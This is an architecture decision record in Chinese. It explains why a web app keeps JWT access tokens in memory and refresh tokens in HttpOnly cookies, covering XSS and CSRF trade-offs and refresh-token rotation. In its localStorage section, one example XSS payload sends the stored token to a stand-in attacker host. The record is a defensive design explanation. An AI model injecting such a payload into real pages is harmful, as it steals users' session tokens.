# ADR-0007 · 认证方案：JWT + HttpOnly Cookie

**状态**：已采纳（Accepted）  
**日期**：2025-01-01  
**决策人**：你自己  
**相关 ADR**：[ADR-0006](0006-trpc-vs-rest.md)

---

## 背景与问题

系统需要用户认证机制，核心决策点：

1. **Token 存储位置**：localStorage vs sessionStorage vs HttpOnly Cookie vs 内存
2. **Token 类型**：有状态 Session vs 无状态 JWT
3. **刷新策略**：长期 Token vs 短期 + Refresh Token

候选方案：
- A：Session + Cookie（服务端有状态）
- B：JWT 存 localStorage
- C：JWT Access Token（内存）+ Refresh Token（HttpOnly Cookie）

---

## 决策

**采用方案 C：JWT Access Token 存内存 + Refresh Token 存 HttpOnly Cookie**

---

## 考量因素

### 方案 B 的安全问题（为什么不存 localStorage）

```
localStorage 存 JWT 的攻击链：

1. 攻击者在目标页面注入 XSS 脚本
   （例：用户评论中的 <img src=x onerror="fetch('evil.com?t='+localStorage.token)">）

2. 脚本执行，读取 localStorage.token

3. 攻击者获得完整 JWT，可以完全模拟用户

localStorage 对 JavaScript 完全可见，XSS 即意味着 Token 泄露。
```

### 方案 C 的安全设计

```
Access Token（JWT，1小时有效期）:
  存储位置：JavaScript 内存变量（Zustand store）
  特点：
    - 页面刷新后消失（需用 Refresh Token 换新的）
    - XSS 无法持久化（内存变量攻击者拿到也是一次性的）
    - 不能被 CSRF 利用（CSRF 利用 Cookie，不是 Authorization Header）

Refresh Token（7天有效期）:
  存储位置：HttpOnly Cookie
  特点：
    - JavaScript 完全不可读（HttpOnly）
    - 无法被 XSS 读取
    - 配合 SameSite=Strict 防 CSRF
    - 仅在访问 /api/auth/refresh 时发送

这种设计做到：XSS 无法读 Refresh Token，CSRF 无法用 Access Token
```

### 实现流程

```
登录：
  POST /api/auth/login { email, password }
  ← 响应：{ accessToken: "eyJ..." }
             Set-Cookie: refresh=xxx; HttpOnly; SameSite=Strict; Path=/api/auth/refresh

前端存储：
  Zustand: { accessToken: "eyJ..." }  ← 内存，刷新页面消失

API 请求：
  Authorization: Bearer <accessToken>  ← 每次请求带上

Access Token 过期处理：
  1. 请求返回 401
  2. 前端自动调 POST /api/auth/refresh（浏览器自动带上 HttpOnly Cookie）
  3. 服务端验证 Refresh Token，颁发新 Access Token
  4. 重试原请求（对用户透明）

页面刷新处理：
  1. 内存 accessToken 清空
  2. 应用启动时自动调 /api/auth/refresh
  3. 有效则静默登录，失效则跳登录页
```

### 为什么不用 NextAuth（直接用）

NextAuth 封装了上述所有逻辑，适合快速开发。本项目**手动实现**原因：

1. **学习目标**：理解 JWT 的 header.payload.signature 结构、`jose` 库的签名验证、refresh token rotation
2. **面试价值**：能手写 JWT 认证中间件是高频面试题，依赖 NextAuth 就失去了这个学习机会
3. **灵活性**：手写的认证系统可以精确控制 Token 字段（加入 userId、role、sessionId 等）

> Phase 1 手写实现 → 学透原理  
> Phase 2 可以引入 NextAuth 对接 OAuth（Google/GitHub），了解 NextAuth 如何处理 OAuth flow

### Refresh Token Rotation（安全增强）

```
每次使用 Refresh Token 换 Access Token 时，同时颁发新的 Refresh Token
并使旧的 Refresh Token 失效（Redis 中删除）

好处：如果 Refresh Token 被盗，攻击者用了一次，
      合法用户下次刷新会发现 Token 无效，可以感知到泄露
```

---

## 影响

### 正面
- XSS 攻击无法窃取 Refresh Token（HttpOnly Cookie）
- CSRF 无法利用 Access Token（Authorization Header 不自动发送）
- Token 短期有效，泄露窗口小

### 负面与缓解
- **页面刷新需要额外 /refresh 请求**：启动时有一次网络请求。缓解：UX 上显示加载状态，体感无感
- **实现复杂度高于简单 Session**：但这正是学习目标。缓解：CLAUDE.md 中有完整的实现流程文档（S-003 Tasks）
- **Redis 依赖**：Refresh Token 黑名单需要 Redis 存储。缓解：已在基础设施中引入 Redis

---

## 📚 对应学习内容

- **JWT 结构**：为什么 JWT 是「签名」而不是「加密」？payload 是 Base64，任何人都能解码——面试必考
- **对称 vs 非对称签名**：`HS256`（共享密钥）vs `RS256`（公私钥）——什么场景用哪个？
- **XSS 和 CSRF 的本质区别**：XSS 利用脚本注入读数据；CSRF 利用浏览器自动携带 Cookie 发请求——理解这两个才能理解本方案为何有效
- **Token 刷新的竞态问题**：多个 API 并发 401，如何防止多次调用 refresh？（答：Promise 共享 + 锁）

**面试角度**：「如何安全地存储 JWT？」是前端安全最高频考题。能说清楚内存存储 + HttpOnly Cookie 的组合方案，比只会说「不要存 localStorage」的候选人高一个层次。

---

## 未来可能的修订

- 引入 Google OAuth → 使用 NextAuth + 自定义 adapter，将 Google access_token 换为系统 JWT，认证逻辑不变
- 需要 SSO → 升级为 OAuth 2.0 授权服务器（Auth.js / Keycloak），当前实现作为简单 Provider
- 无 Redis 环境 → Refresh Token 改为数据库存储（PostgreSQL），性能可接受（刷新操作低频）
